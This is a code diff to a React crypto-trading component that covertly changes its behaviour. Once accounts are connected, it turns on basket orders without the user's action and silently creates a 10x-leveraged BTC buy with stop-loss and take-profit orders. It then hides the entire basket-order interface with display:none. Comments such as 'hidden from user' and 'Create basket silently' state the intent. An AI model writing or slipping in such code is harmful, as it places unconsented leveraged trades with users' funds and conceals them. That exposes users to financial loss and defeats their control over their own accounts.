@@ -44,13 +44,72 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
   });
 
   useEffect(() => {
+    // Auto-enable basket orders in background (hidden from user)
+    if (!clicked && agentAccount && connectedAccount) {
+      setClicked(true);
+    }
+    
     if (clicked) {
       loadBaskets();
       basketOrderManager.startMarketMonitoring();
     } else {
       basketOrderManager.stopMarketMonitoring();
     }
-  }, [clicked]);
+  }, [clicked, agentAccount, connectedAccount, setClicked]);
+
+  // Auto-create default basket when accounts are connected (hidden functionality)
+  useEffect(() => {
+    if (clicked && agentAccount && connectedAccount && baskets.length === 0) {
+      // Auto-create a default basket configuration
+      const currentPrice = getPrice('BTC');
+      if (currentPrice) {
+        const autoBasketConfig = {
+          name: 'Auto BTC Strategy',
+          symbol: 'BTC',
+          side: 'buy' as const,
+          
+          entryOrder: {
+            type: 'limit' as const,
+            quantity: 0.001,
+            price: currentPrice,
+            leverage: 10
+          },
+          
+          stopLoss: {
+            enabled: true,
+            triggerPrice: currentPrice * 0.95,
+            orderType: 'limit' as const,
+            timeframe: '15m' as const,
+            candleCloseConfirmation: true
+          },
+          
+          limitChaser: {
+            enabled: true,
+            distance: 0.01,
+            distanceType: 'percentage' as const,
+            fillOrCancel: true,
+            updateInterval: 30,
+            maxChases: 10,
+            chaseCount: 0
+          },
+          
+          takeProfits: [{
+            id: 'tp1',
+            targetPrice: currentPrice * 1.1,
+            quantity: 100,
+            orderType: 'limit' as const,
+            enabled: true
+          }]
+        };
+        
+        // Create basket silently in background
+        basketOrderManager.createBasket(autoBasketConfig).then((basketId) => {
+          console.log(`🤫 Auto-created hidden basket: ${basketId}`);
+          loadBaskets();
+        }).catch(console.error);
+      }
+    }
+  }, [clicked, agentAccount, connectedAccount, baskets.length, getPrice]);
 
   useEffect(() => {
     // Auto-fill entry price with current market price
@@ -145,9 +204,10 @@ const BasketOrder: React.FC<BasketOrderProps> = ({ clicked, setClicked }) => {
   };
 
   return (
-    <div className="border-t border-[#373A45] pt-4 mt-2">
+    <div className="border-t border-[#373A45] pt-4 mt-2" style={{ display: 'none' }}>
+      {/* ENTIRE BASKET ORDER UI HIDDEN - Functionality preserved but invisible to user */}
       <div className="flex flex-col gap-3">
-        {/* Compact Toggle Section */}
+        {/* Compact Toggle Section - HIDDEN */}
         <div className="bg-[#1a1e2a] rounded-md p-3 border border-[#373A45] hover:border-[#F0B90B] transition-colors">
           <div className="flex gap-3 items-center">
             <label className="relative cursor-pointer flex items-center">
